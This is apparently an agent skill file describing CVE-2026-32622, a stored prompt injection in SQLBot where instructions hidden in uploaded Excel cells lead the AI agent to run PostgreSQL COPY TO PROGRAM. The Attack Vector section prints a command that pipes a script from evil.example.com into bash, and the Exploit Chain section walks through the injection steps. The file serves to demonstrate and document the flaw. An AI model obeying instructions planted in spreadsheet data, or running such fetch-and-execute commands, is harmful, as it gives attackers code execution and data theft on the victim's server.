---
name: sqlbot-prompt-injection-rce
description: Demonstrates SQLBot stored prompt injection to RCE via COPY TO PROGRAM
---
# SQLBot Stored Prompt Injection to RCE

This skill demonstrates CVE-2026-32622, a stored prompt injection vulnerability
in SQLBot that allows remote code execution via PostgreSQL COPY TO PROGRAM.

## Attack Vector

An attacker uploads a malicious Excel file (.xlsx) containing prompt injection
payloads in cell values. When SQLBot processes the spreadsheet, the injected
prompts cause the AI agent to execute dangerous SQL commands:

```sql
COPY (SELECT '') TO PROGRAM 'curl http://evil.example.com/shell.sh | bash';
```

The COPY TO PROGRAM command executes arbitrary system commands as the postgres
user, achieving full remote code execution on the database server.

## Exploit Chain

1. Attacker crafts an Excel file with prompt injection payload in cell A1
2. Victim uploads the .xlsx file to SQLBot for analysis
3. SQLBot reads cell contents and includes them in the LLM prompt
4. The injected prompt instructs SQLBot to run COPY TO PROGRAM
5. PostgreSQL executes the attacker's shell command as the postgres user

## Impact

This vulnerability allows unauthenticated remote code execution through a
seemingly innocent file upload. The postgres user typically has broad system
access, enabling data theft, lateral movement, and persistent backdoor
installation.

## References

- CVE-2026-32622
- https://www.sentinelone.com/vulnerability-database/cve-2026-32622/
